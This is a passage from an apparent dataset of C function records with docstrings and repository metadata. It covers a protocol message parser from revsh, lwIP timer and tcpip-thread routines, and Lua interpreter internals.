sizeof(message->data_len);\n\n\tif(header_len > io->message_data_size){\n\t\treport_error(\"message_pull(): message: remote header too long!\\n\");\n\t\treturn(-1);\n\t}\n\n\tif(message->data_type == DT_PROXY || message->data_type == DT_CONNECTION){\n\n\t\tif((retval = io->remote_read(&message->header_type, sizeof(message->header_type))) == -1){\n\t\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", \\\n\t\t\t\t\t(unsigned long) &message->header_type, (int) sizeof(message->header_type), strerror(errno));\n\t\t\treturn(-1);\n\t\t}\t\n\t\tmessage->header_type = ntohs(message->header_type);\n\t\theader_len -= sizeof(message->header_type);\n\n\t\tif((retval = io->remote_read(&message->header_origin, sizeof(message->header_origin))) == -1){\n\t\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", \\\n\t\t\t\t\t(unsigned long) &message->header_origin, (int) sizeof(message->header_origin), strerror(errno));\n\t\t\treturn(-1);\n\t\t}\t\n\t\tmessage->header_origin = ntohs(message->header_origin);\n\t\theader_len -= sizeof(message->header_origin);\n\n\t\tif((retval = io->remote_read(&message->header_id, sizeof(message->header_id))) == -1){\n\t\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", \\\n\t\t\t\t\t(unsigned long) &message->header_id, (int) sizeof(message->header_id), strerror(errno));\n\t\t\treturn(-1);\n\t\t}\t\n\t\tmessage->header_id = ntohs(message->header_id);\n\t\theader_len -= sizeof(message->header_id);\n\n\t\tif(message->header_type == DT_PROXY_HT_CREATE || message->header_type == DT_PROXY_HT_REPORT || message->header_type == DT_CONNECTION_HT_CREATE){\n\t\t\tif((retval = io->remote_read(&message->header_proxy_type, sizeof(message->header_proxy_type))) == -1){\n\t\t\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", \\\n\t\t\t\t\t\t(unsigned long) &message->header_proxy_type, (int) sizeof(message->header_proxy_type), strerror(errno));\n\t\t\t\treturn(-1);\n\t\t\t}\t\n\t\t\tmessage->header_proxy_type = ntohs(message->header_proxy_type);\n\t\t\theader_len -= sizeof(message->header_proxy_type);\n\t\t}\n\t}\n\n\t/* Ignore any remaining header data as unknown, and probably from a more modern version of the */\n\t/* protocol than we were compiled with. */\n\tif(header_len){\n\n\t\tif(header_len > io->message_data_size){\n\t\t\treport_error(\"message_pull(): headers bigger than buffer!\");\n\t\t\treturn(-1);\n\t\t}\n\n\t\tif((retval = io->remote_read(message->data, header_len)) == -1){\n\t\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", (unsigned long) message->data, header_len, strerror(errno));\n\t\t\treturn(-1);\n\t\t}\t\n\t}\n\n\t/* Grab the data. */\n\tif(message->data_len > io->message_data_size){\n\t\treport_error(\"message_pull(): message: remote data too long!\");\n\t\treturn(-1);\n\t}\n\n\tif((retval = io->remote_read(message->data, message->data_len)) == -1){\n\t\treport_error(\"message_pull(): remote_read(%lx, %d): %s\", (unsigned long) message->data, message->data_len, strerror(errno));\n\t\treturn(-1);\n\t}\t\n\n\treturn(0);\n}", "path": "message.c", "repo_name": "emptymonkey/revsh", "stars": 448, "license": "mit", "language": "c", "size": 597}
{"docstring": "/**\n * Timer callback function that calls igmp_tmr() and reschedules itself.\n *\n * @param arg unused argument\n */\n", "func_signal": "static void\nigmp_timer(void *arg)", "code": "{\n  LWIP_UNUSED_ARG(arg);\n  LWIP_DEBUGF(TIMERS_DEBUG, (\"tcpip: igmp_tmr()\\n\"));\n  igmp_tmr();\n  sys_timeout(IGMP_TMR_INTERVAL, igmp_timer, NULL);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Wait (forever) for a message to arrive in an mbox.\n * While waiting, timeouts are processed.\n *\n * @param mbox the mbox to fetch the message from\n * @param msg the place to store the message\n */\n", "func_signal": "void\nsys_timeouts_mbox_fetch(sys_mbox_t *mbox, void **msg)", "code": "{\n  u32_t time_needed;\n  struct sys_timeo *tmptimeout;\n  sys_timeout_handler handler;\n  void *arg;\n\n again:\n  if (!next_timeout) {\n    time_needed = sys_arch_mbox_fetch(mbox, msg, 0);\n  } else {\n    if (next_timeout->time > 0) {\n      time_needed = sys_arch_mbox_fetch(mbox, msg, next_timeout->time);\n    } else {\n      time_needed = SYS_ARCH_TIMEOUT;\n    }\n\n    if (time_needed == SYS_ARCH_TIMEOUT) {\n      /* If time == SYS_ARCH_TIMEOUT, a timeout occured before a message\n         could be fetched. We should now call the timeout handler and\n         deallocate the memory allocated for the timeout. */\n      tmptimeout = next_timeout;\n      next_timeout = tmptimeout->next;\n      handler = tmptimeout->h;\n      arg = tmptimeout->arg;\n#if LWIP_DEBUG_TIMERNAMES\n      if (handler != NULL) {\n        LWIP_DEBUGF(TIMERS_DEBUG, (\"stmf calling h=%s arg=%p\\n\",\n          tmptimeout->handler_name, arg));\n      }\n#endif /* LWIP_DEBUG_TIMERNAMES */\n      memp_free(MEMP_SYS_TIMEOUT, tmptimeout);\n      if (handler != NULL) {\n        /* For LWIP_TCPIP_CORE_LOCKING, lock the core before calling the\n           timeout handler function. */\n        LOCK_TCPIP_CORE();\n        handler(arg);\n        UNLOCK_TCPIP_CORE();\n      }\n      LWIP_TCPIP_THREAD_ALIVE();\n\n      /* We try again to fetch a message from the mbox. */\n      goto again;\n    } else {\n      /* If time != SYS_ARCH_TIMEOUT, a message was received before the timeout\n         occured. The time variable is set to the number of\n         milliseconds we waited for the message. */\n      if (time_needed < next_timeout->time) {\n        next_timeout->time -= time_needed;\n      } else {\n        next_timeout->time = 0;\n      }\n    }\n  }\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * call sys_untimeout in tcpip_thread\n *\n * @param msec time in milliseconds for timeout\n * @param h function to be called on timeout\n * @param arg argument to pass to timeout function h\n * @return ERR_MEM on memory error, ERR_OK otherwise\n */\n", "func_signal": "err_t\ntcpip_untimeout(sys_timeout_handler h, void *arg)", "code": "{\n  struct tcpip_msg *msg;\n\n  if (sys_mbox_valid(&mbox)) {\n    msg = (struct tcpip_msg *)memp_malloc(MEMP_TCPIP_MSG_API);\n    if (msg == NULL) {\n      return ERR_MEM;\n    }\n\n    msg->type = TCPIP_MSG_UNTIMEOUT;\n    msg->msg.tmo.h = h;\n    msg->msg.tmo.arg = arg;\n    sys_mbox_post(&mbox, msg);\n    return ERR_OK;\n  }\n  return ERR_VAL;\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/* !LWIP_TCPIP_CORE_LOCKING */\n/**\n * Call the lower part of a netifapi_* function\n * This function has exclusive access to lwIP core code by locking it\n * before the function is called.\n *\n * @param netifapimsg a struct containing the function to call and its parameters\n * @return ERR_OK (only for compatibility fo tcpip_netifapi())\n */\n", "func_signal": "err_t\ntcpip_netifapi_lock(struct netifapi_msg* netifapimsg)", "code": "{\n  LOCK_TCPIP_CORE();  \n  netifapimsg->function(&(netifapimsg->msg));\n  UNLOCK_TCPIP_CORE();\n  return netifapimsg->msg.err;\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Timer callback function that calls ip_reass_tmr() and reschedules itself.\n *\n * @param arg unused argument\n */\n", "func_signal": "static void\nip_reass_timer(void *arg)", "code": "{\n  LWIP_UNUSED_ARG(arg);\n  LWIP_DEBUGF(TIMERS_DEBUG, (\"tcpip: ip_reass_tmr()\\n\"));\n  ip_reass_tmr();\n  sys_timeout(IP_TMR_INTERVAL, ip_reass_timer, NULL);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Timer callback function that calls etharp_tmr() and reschedules itself.\n *\n * @param arg unused argument\n */\n", "func_signal": "static void\narp_timer(void *arg)", "code": "{\n  LWIP_UNUSED_ARG(arg);\n  LWIP_DEBUGF(TIMERS_DEBUG, (\"tcpip: etharp_tmr()\\n\"));\n  etharp_tmr();\n  sys_timeout(ARP_TMR_INTERVAL, arp_timer, NULL);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Initialize this module:\n * - initialize all sub modules\n * - start the tcpip_thread\n *\n * @param initfunc a function to call when tcpip_thread is running and finished initializing\n * @param arg argument to pass to initfunc\n */\n", "func_signal": "void\ntcpip_init(tcpip_init_done_fn initfunc, void *arg)", "code": "{\n  lwip_init();\n\n  tcpip_init_done = initfunc;\n  tcpip_init_done_arg = arg;\n  if(sys_mbox_new(&mbox, TCPIP_MBOX_SIZE) != ERR_OK) {\n    LWIP_ASSERT(\"failed to create tcpip_thread mbox\", 0);\n  }\n#if LWIP_TCPIP_CORE_LOCKING\n  if(sys_mutex_new(&lock_tcpip_core) != ERR_OK) {\n    LWIP_ASSERT(\"failed to create lock_tcpip_core\", 0);\n  }\n#endif /* LWIP_TCPIP_CORE_LOCKING */\n\n  sys_thread_new(TCPIP_THREAD_NAME, tcpip_thread, NULL, TCPIP_THREAD_STACKSIZE, TCPIP_THREAD_PRIO);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Simple callback function used with tcpip_callback to free a pbuf\n * (pbuf_free has a wrong signature for tcpip_callback)\n *\n * @param p The pbuf (chain) to be dereferenced.\n */\n", "func_signal": "static void\npbuf_free_int(void *p)", "code": "{\n  struct pbuf *q = (struct pbuf *)p;\n  pbuf_free(q);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Call a specific function in the thread context of\n * tcpip_thread for easy access synchronization.\n * A function called in that way may access lwIP core code\n * without fearing concurrent access.\n *\n * @param f the function to call\n * @param ctx parameter passed to f\n * @param block 1 to block until the request is posted, 0 to non-blocking mode\n * @return ERR_OK if the function was called, another err_t if not\n */\n", "func_signal": "err_t\ntcpip_callback_with_block(tcpip_callback_fn function, void *ctx, u8_t block)", "code": "{\n  struct tcpip_msg *msg;\n\n  if (sys_mbox_valid(&mbox)) {\n    msg = (struct tcpip_msg *)memp_malloc(MEMP_TCPIP_MSG_API);\n    if (msg == NULL) {\n      return ERR_MEM;\n    }\n\n    msg->type = TCPIP_MSG_CALLBACK;\n    msg->msg.cb.function = function;\n    msg->msg.cb.ctx = ctx;\n    if (block) {\n      sys_mbox_post(&mbox, msg);\n    } else {\n      if (sys_mbox_trypost(&mbox, msg) != ERR_OK) {\n        memp_free(MEMP_TCPIP_MSG_API, msg);\n        return ERR_MEM;\n      }\n    }\n    return ERR_OK;\n  }\n  return ERR_VAL;\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Pass a received packet to tcpip_thread for input processing\n *\n * @param p the received packet, p->payload pointing to the Ethernet header or\n *          to an IP header (if inp doesn't have NETIF_FLAG_ETHARP or\n *          NETIF_FLAG_ETHERNET flags)\n * @param inp the network interface on which the packet was received\n */\n", "func_signal": "err_t\ntcpip_input(struct pbuf *p, struct netif *inp)", "code": "{\n#if LWIP_TCPIP_CORE_LOCKING_INPUT\n  err_t ret;\n  LWIP_DEBUGF(TCPIP_DEBUG, (\"tcpip_input: PACKET %p/%p\\n\", (void *)p, (void *)inp));\n  LOCK_TCPIP_CORE();\n#if LWIP_ETHERNET\n  if (inp->flags & (NETIF_FLAG_ETHARP | NETIF_FLAG_ETHERNET)) {\n    ret = ethernet_input(p, inp);\n  } else\n#endif /* LWIP_ETHERNET */\n  {\n    ret = ip_input(p, inp);\n  }\n  UNLOCK_TCPIP_CORE();\n  return ret;\n#else /* LWIP_TCPIP_CORE_LOCKING_INPUT */\n  struct tcpip_msg *msg;\n\n  if (!sys_mbox_valid(&mbox)) {\n    return ERR_VAL;\n  }\n  msg = (struct tcpip_msg *)memp_malloc(MEMP_TCPIP_MSG_INPKT);\n  if (msg == NULL) {\n    return ERR_MEM;\n  }\n\n  msg->type = TCPIP_MSG_INPKT;\n  msg->msg.inp.p = p;\n  msg->msg.inp.netif = inp;\n  if (sys_mbox_trypost(&mbox, msg) != ERR_OK) {\n    memp_free(MEMP_TCPIP_MSG_INPKT, msg);\n    return ERR_MEM;\n  }\n  return ERR_OK;\n#endif /* LWIP_TCPIP_CORE_LOCKING_INPUT */\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/** Handle timeouts for NO_SYS==1 (i.e. without using\n * tcpip_thread/sys_timeouts_mbox_fetch(). Uses sys_now() to call timeout\n * handler functions when timeouts expire.\n *\n * Must be called periodically from your main loop.\n */\n", "func_signal": "void\nsys_check_timeouts(void)", "code": "{\n  if (next_timeout) {\n    struct sys_timeo *tmptimeout;\n    u32_t diff;\n    sys_timeout_handler handler;\n    void *arg;\n    u8_t had_one;\n    u32_t now;\n\n    now = sys_now();\n    /* this cares for wraparounds */\n    diff = now - timeouts_last_time;\n    do\n    {\n#if PBUF_POOL_FREE_OOSEQ\n      PBUF_CHECK_FREE_OOSEQ();\n#endif /* PBUF_POOL_FREE_OOSEQ */\n      had_one = 0;\n      tmptimeout = next_timeout;\n      if (tmptimeout && (tmptimeout->time <= diff)) {\n        /* timeout has expired */\n        had_one = 1;\n        timeouts_last_time = now;\n        diff -= tmptimeout->time;\n        next_timeout = tmptimeout->next;\n        handler = tmptimeout->h;\n        arg = tmptimeout->arg;\n#if LWIP_DEBUG_TIMERNAMES\n        if (handler != NULL) {\n          LWIP_DEBUGF(TIMERS_DEBUG, (\"sct calling h=%s arg=%p\\n\",\n            tmptimeout->handler_name, arg));\n        }\n#endif /* LWIP_DEBUG_TIMERNAMES */\n        memp_free(MEMP_SYS_TIMEOUT, tmptimeout);\n        if (handler != NULL) {\n          handler(arg);\n        }\n      }\n    /* repeat until all expired timers have been called */\n    }while(had_one);\n  }\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/** Initialize this module */\n", "func_signal": "void sys_timeouts_init(void)", "code": "{\n#if IP_REASSEMBLY\n  sys_timeout(IP_TMR_INTERVAL, ip_reass_timer, NULL);\n#endif /* IP_REASSEMBLY */\n#if LWIP_ARP\n  sys_timeout(ARP_TMR_INTERVAL, arp_timer, NULL);\n#endif /* LWIP_ARP */\n#if LWIP_DHCP\n  sys_timeout(DHCP_COARSE_TIMER_MSECS, dhcp_timer_coarse, NULL);\n  sys_timeout(DHCP_FINE_TIMER_MSECS, dhcp_timer_fine, NULL);\n#endif /* LWIP_DHCP */\n#if LWIP_AUTOIP\n  sys_timeout(AUTOIP_TMR_INTERVAL, autoip_timer, NULL);\n#endif /* LWIP_AUTOIP */\n#if LWIP_IGMP\n  sys_timeout(IGMP_TMR_INTERVAL, igmp_timer, NULL);\n#endif /* LWIP_IGMP */\n#if LWIP_DNS\n  sys_timeout(DNS_TMR_INTERVAL, dns_timer, NULL);\n#endif /* LWIP_DNS */\n\n#if NO_SYS\n  /* Initialise timestamp for sys_check_timeouts */\n  timeouts_last_time = sys_now();\n#endif\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Try to post a callback-message to the tcpip_thread mbox\n * This is intended to be used to send \"static\" messages from interrupt context.\n *\n * @param msg pointer to the message to post\n * @return sys_mbox_trypost() return code\n */\n", "func_signal": "err_t\ntcpip_trycallback(struct tcpip_callback_msg* msg)", "code": "{\n  if (!sys_mbox_valid(&mbox)) {\n    return ERR_VAL;\n  }\n  return sys_mbox_trypost(&mbox, msg);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Call the lower part of a netconn_* function\n * This function is then running in the thread context\n * of tcpip_thread and has exclusive access to lwIP core code.\n *\n * @param apimsg a struct containing the function to call and its parameters\n * @return ERR_OK if the function was called, another err_t if not\n */\n", "func_signal": "err_t\ntcpip_apimsg(struct api_msg *apimsg)", "code": "{\n  struct tcpip_msg msg;\n#ifdef LWIP_DEBUG\n  /* catch functions that don't set err */\n  apimsg->msg.err = ERR_VAL;\n#endif\n  \n  if (sys_mbox_valid(&mbox)) {\n    msg.type = TCPIP_MSG_API;\n    msg.msg.apimsg = apimsg;\n    sys_mbox_post(&mbox, &msg);\n    sys_arch_sem_wait(&apimsg->msg.conn->op_completed, 0);\n    return apimsg->msg.err;\n  }\n  return ERR_VAL;\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Much like tcpip_apimsg, but calls the lower part of a netifapi_*\n * function.\n *\n * @param netifapimsg a struct containing the function to call and its parameters\n * @return error code given back by the function that was called\n */\n", "func_signal": "err_t\ntcpip_netifapi(struct netifapi_msg* netifapimsg)", "code": "{\n  struct tcpip_msg msg;\n  \n  if (sys_mbox_valid(&mbox)) {\n    err_t err = sys_sem_new(&netifapimsg->msg.sem, 0);\n    if (err != ERR_OK) {\n      netifapimsg->msg.err = err;\n      return err;\n    }\n    \n    msg.type = TCPIP_MSG_NETIFAPI;\n    msg.msg.netifapimsg = netifapimsg;\n    sys_mbox_post(&mbox, &msg);\n    sys_sem_wait(&netifapimsg->msg.sem);\n    sys_sem_free(&netifapimsg->msg.sem);\n    return netifapimsg->msg.err;\n  }\n  return ERR_VAL;\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Go through timeout list (for this task only) and remove the first matching\n * entry, even though the timeout has not triggered yet.\n *\n * @note This function only works as expected if there is only one timeout\n * calling 'handler' in the list of timeouts.\n *\n * @param handler callback function that would be called by the timeout\n * @param arg callback argument that would be passed to handler\n*/\n", "func_signal": "void\nsys_untimeout(sys_timeout_handler handler, void *arg)", "code": "{\n  struct sys_timeo *prev_t, *t;\n\n  if (next_timeout == NULL) {\n    return;\n  }\n\n  for (t = next_timeout, prev_t = NULL; t != NULL; prev_t = t, t = t->next) {\n    if ((t->h == handler) && (t->arg == arg)) {\n      /* We have a match */\n      /* Unlink from previous in list */\n      if (prev_t == NULL) {\n        next_timeout = t->next;\n      } else {\n        prev_t->next = t->next;\n      }\n      /* If not the last one, add time of this one back to next */\n      if (t->next != NULL) {\n        t->next->time += t->time;\n      }\n      memp_free(MEMP_SYS_TIMEOUT, t);\n      return;\n    }\n  }\n  return;\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Timer callback function that calls dhcp_coarse_tmr() and reschedules itself.\n *\n * @param arg unused argument\n */\n", "func_signal": "static void\ndhcp_timer_coarse(void *arg)", "code": "{\n  LWIP_UNUSED_ARG(arg);\n  LWIP_DEBUGF(TIMERS_DEBUG, (\"tcpip: dhcp_coarse_tmr()\\n\"));\n  dhcp_coarse_tmr();\n  sys_timeout(DHCP_COARSE_TIMER_MSECS, dhcp_timer_coarse, NULL);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Timer callback function that calls dhcp_fine_tmr() and reschedules itself.\n *\n * @param arg unused argument\n */\n", "func_signal": "static void\ndhcp_timer_fine(void *arg)", "code": "{\n  LWIP_UNUSED_ARG(arg);\n  LWIP_DEBUGF(TIMERS_DEBUG, (\"tcpip: dhcp_fine_tmr()\\n\"));\n  dhcp_fine_tmr();\n  sys_timeout(DHCP_FINE_TIMER_MSECS, dhcp_timer_fine, NULL);\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Timer callback function that calls tcp_tmr() and reschedules itself.\n *\n * @param arg unused argument\n */\n", "func_signal": "static void\ntcpip_tcp_timer(void *arg)", "code": "{\n  LWIP_UNUSED_ARG(arg);\n\n  /* call TCP timer handler */\n  tcp_tmr();\n  /* timer still needed? */\n  if (tcp_active_pcbs || tcp_tw_pcbs) {\n    /* restart timer */\n    sys_timeout(TCP_TMR_INTERVAL, tcpip_tcp_timer, NULL);\n  } else {\n    /* disable timer */\n    tcpip_tcp_timer_active = 0;\n  }\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\core\\timers.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/**\n * Call the lower part of a netconn_* function\n * This function has exclusive access to lwIP core code by locking it\n * before the function is called.\n *\n * @param apimsg a struct containing the function to call and its parameters\n * @return ERR_OK (only for compatibility fo tcpip_apimsg())\n */\n", "func_signal": "err_t\ntcpip_apimsg_lock(struct api_msg *apimsg)", "code": "{\n#ifdef LWIP_DEBUG\n  /* catch functions that don't set err */\n  apimsg->msg.err = ERR_VAL;\n#endif\n\n  LOCK_TCPIP_CORE();\n  apimsg->function(&(apimsg->msg));\n  UNLOCK_TCPIP_CORE();\n  return apimsg->msg.err;\n\n}", "path": "Tortilla\\Tortilla\\lwIP\\src\\api\\tcpip.c", "repo_name": "CrowdStrike/Tortilla", "stars": 276, "license": "other", "language": "c", "size": 396}
{"docstring": "/*\n** Convert a number object to a string\n*/\n", "func_signal": "void luaO_tostring (lua_State *L, StkId obj)", "code": "{\n  char buff[MAXNUMBER2STR];\n  size_t len;\n  lua_assert(ttisnumber(obj));\n  if (ttisinteger(obj))\n    len = lua_integer2str(buff, ivalue(obj));\n  else {\n    len = lua_number2str(buff, fltvalue(obj));\n#if !defined(LUA_COMPAT_FLOATSTRING)\n    if (buff[strspn(buff, \"-0123456789\")] == '\\0') {  /* looks like an int? */\n      buff[len++] = '.';\n      buff[len++] = '0';  /* adds '.0' to result */\n    }\n#endif\n  }\n  setsvalue2s(L, obj, luaS_newlstr(L, buff, len));\n}", "path": "example\\luaTest\\lua\\lobject.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/* converts back */\n", "func_signal": "int luaO_fb2int (int x)", "code": "{\n  int e = (x >> 3) & 0x1f;\n  if (e == 0) return x;\n  else return ((x & 7) + 8) << (e - 1);\n}", "path": "example\\luaTest\\lua\\lobject.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Try to find a suspended protected call (a \"recover point\") for the\n** given thread.\n*/\n", "func_signal": "static CallInfo *findpcall (lua_State *L)", "code": "{\n  CallInfo *ci;\n  for (ci = L->ci; ci != NULL; ci = ci->previous) {  /* search for a pcall */\n    if (ci->callstatus & CIST_YPCALL)\n      return ci;\n  }\n  return NULL;  /* no pending pcall */\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Do the work for 'lua_resume' in protected mode. Most of the work\n** depends on the status of the coroutine: initial state, suspended\n** inside a hook, or regularly suspended (optionally with a continuation\n** function), plus erroneous cases: non-suspended coroutine or dead\n** coroutine.\n*/\n", "func_signal": "static void resume (lua_State *L, void *ud)", "code": "{\n  int nCcalls = L->nCcalls;\n  StkId firstArg = cast(StkId, ud);\n  CallInfo *ci = L->ci;\n  if (nCcalls >= LUAI_MAXCCALLS)\n    resume_error(L, \"C stack overflow\", firstArg);\n  if (L->status == LUA_OK) {  /* may be starting a coroutine */\n    if (ci != &L->base_ci)  /* not in base level? */\n      resume_error(L, \"cannot resume non-suspended coroutine\", firstArg);\n    /* coroutine is in base level; start running it */\n    if (!luaD_precall(L, firstArg - 1, LUA_MULTRET))  /* Lua function? */\n      luaV_execute(L);  /* call it */\n  }\n  else if (L->status != LUA_YIELD)\n    resume_error(L, \"cannot resume dead coroutine\", firstArg);\n  else {  /* resuming from previous yield */\n    L->status = LUA_OK;  /* mark that it is running (again) */\n    ci->func = restorestack(L, ci->extra);\n    if (isLua(ci))  /* yielded inside a hook? */\n      luaV_execute(L);  /* just continue running Lua code */\n    else {  /* 'common' yield */\n      if (ci->u.c.k != NULL) {  /* does it have a continuation function? */\n        int n;\n        lua_unlock(L);\n        n = (*ci->u.c.k)(L, LUA_YIELD, ci->u.c.ctx); /* call continuation */\n        lua_lock(L);\n        api_checknelems(L, n);\n        firstArg = L->top - n;  /* yield results come from continuation */\n      }\n      luaD_poscall(L, firstArg);  /* finish 'luaD_precall' */\n    }\n    unroll(L, NULL);  /* run continuation */\n  }\n  lua_assert(nCcalls == L->nCcalls);\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Recovers from an error in a coroutine. Finds a recover point (if\n** there is one) and completes the execution of the interrupted\n** 'luaD_pcall'. If there is no recover point, returns zero.\n*/\n", "func_signal": "static int recover (lua_State *L, int status)", "code": "{\n  StkId oldtop;\n  CallInfo *ci = findpcall(L);\n  if (ci == NULL) return 0;  /* no recovery point */\n  /* \"finish\" luaD_pcall */\n  oldtop = restorestack(L, ci->extra);\n  luaF_close(L, oldtop);\n  seterrorobj(L, status, oldtop);\n  L->ci = ci;\n  L->allowhook = getoah(ci->callstatus);  /* restore original 'allowhook' */\n  L->nny = 0;  /* should be zero to be yieldable */\n  luaD_shrinkstack(L);\n  L->errfunc = ci->u.c.old_errfunc;\n  return 1;  /* continue running the coroutine */\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Completes the execution of an interrupted C function, calling its\n** continuation function.\n*/\n", "func_signal": "static void finishCcall (lua_State *L, int status)", "code": "{\n  CallInfo *ci = L->ci;\n  int n;\n  /* must have a continuation and must be able to call it */\n  lua_assert(ci->u.c.k != NULL && L->nny == 0);\n  /* error status can only happen in a protected call */\n  lua_assert((ci->callstatus & CIST_YPCALL) || status == LUA_YIELD);\n  if (ci->callstatus & CIST_YPCALL) {  /* was inside a pcall? */\n    ci->callstatus &= ~CIST_YPCALL;  /* finish 'lua_pcall' */\n    L->errfunc = ci->u.c.old_errfunc;\n  }\n  /* finish 'lua_callk'/'lua_pcall'; CIST_YPCALL and 'errfunc' already\n     handled */\n  adjustresults(L, ci->nresults);\n  /* call continuation function */\n  lua_unlock(L);\n  n = (*ci->u.c.k)(L, status, ci->u.c.ctx);\n  lua_lock(L);\n  api_checknelems(L, n);\n  /* finish 'luaD_precall' */\n  luaD_poscall(L, L->top - n);\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/* }====================================================== */\n", "func_signal": "static void correctstack (lua_State *L, TValue *oldstack)", "code": "{\n  CallInfo *ci;\n  UpVal *up;\n  L->top = (L->top - oldstack) + L->stack;\n  for (up = L->openupval; up != NULL; up = up->u.open.next)\n    up->v = (up->v - oldstack) + L->stack;\n  for (ci = L->ci; ci != NULL; ci = ci->previous) {\n    ci->top = (ci->top - oldstack) + L->stack;\n    ci->func = (ci->func - oldstack) + L->stack;\n    if (isLua(ci))\n      ci->u.l.base = (ci->u.l.base - oldstack) + L->stack;\n  }\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/* from strlib */\n/* translate a relative string position: negative means back from end */\n", "func_signal": "static lua_Integer u_posrelat (lua_Integer pos, size_t len)", "code": "{\n  if (pos >= 0) return pos;\n  else if (0u - (size_t)pos > len) return 0;\n  else return (lua_Integer)len + pos + 1;\n}", "path": "example\\luaTest\\lua\\lutf8lib.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
